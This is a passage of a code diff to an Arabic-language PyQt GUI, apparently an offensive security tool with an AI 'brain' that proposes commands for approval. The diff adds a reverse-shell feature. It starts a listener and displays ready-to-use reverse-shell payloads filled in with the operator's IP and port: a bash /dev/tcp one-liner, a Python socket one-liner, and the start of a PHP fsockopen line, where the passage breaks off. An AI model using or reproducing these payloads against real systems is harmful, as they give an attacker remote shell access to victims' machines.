+        colors = {"عالية": "#ff4444", "متوسطة": "#ffaa00", "منخفضة": "#00ff00"}
+        color = colors.get(priority, "white")
+        
+        self.reason_label.setText(f"💡 {reason}")
+        self.reason_label.setStyleSheet(f"color: {color}; font-weight: bold;")
+        self.command_display.setText(cmd)
+        self.approve_btn.setEnabled(True)
+        self.reject_btn.setEnabled(True)
+        
+    def approve_command(self):
+        """موافقة على الأمر"""
+        self.approve_btn.setEnabled(False)
+        self.reject_btn.setEnabled(False)
+        if self.brain:
+            self.brain.approve_command()
+            
+    def reject_command(self):
+        """رفض الأمر"""
+        self.approve_btn.setEnabled(False)
+        self.reject_btn.setEnabled(False)
+        if self.brain:
+            self.brain.reject_command()
+            
     def update_log(self, msg, color):
-        self.console.append(f"<font color='{color}'>{msg}</font>")
-
-if __name__ == "__main__":
-    app = QApplication(sys.argv)
-    window = GhenaAI_V36(); window.show()
-    sys.exit(app.exec())
+        """تحديث الشاشة"""
+        color_code = COLORS.get(color, color)
+        self.console.append(f"<font color='{color_code}'>{msg}</font>")
+        
+    def add_finding(self, finding):
+        """إضافة نتيجة"""
+        color = "#ff4444" if finding.get("severity") == "CRITICAL" else "#ffaa00"
+        text = f"""
+        <div style="border: 1px solid {color}; margin: 5px; padding: 10px;">
+            <h3 style="color: {color};">{finding['title']}</h3>
+            <p>{finding.get('description', '')}</p>
+            <pre style="background: #000; color: #0f0;">{finding.get('command', '')}</pre>
+        </div>
+        """
+        self.findings_text.append(text)
+        
+    def start_shell(self):
+        """بدء Reverse Shell"""
+        port, ok = QInputDialog.getInt(self, "Reverse Shell", "أدخل المنفذ:", 4444, 1, 65535)
+        if ok:
+            def shell_callback(msg):
+                self.update_log(f"[Shell] {msg}", "shell")
+                
+            self.shell_manager.start_listener(port, shell_callback)
+            
+            # عرض البايلودات
+            lhost = self.shell_manager.get_local_ip()
+            payloads = QMessageBox()
+            payloads.setWindowTitle("🎯 Reverse Shell Payloads")
+            payloads.setText(f"""
+            <b>IP المحلي:</b> {lhost}<br>
+            <b>المنفذ:</b> {port}<br><br>
+            
+            <b>Linux Bash:</b><br>
+            <code>bash -i >& /dev/tcp/{lhost}/{port} 0>&1</code><br><br>
+            
+            <b>Linux Python:</b><br>
+            <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code><br><br>
+            
+            <b>PHP:</b><br>
+            <code>php -r '$sock=fsockopen("{lhost}",{port});
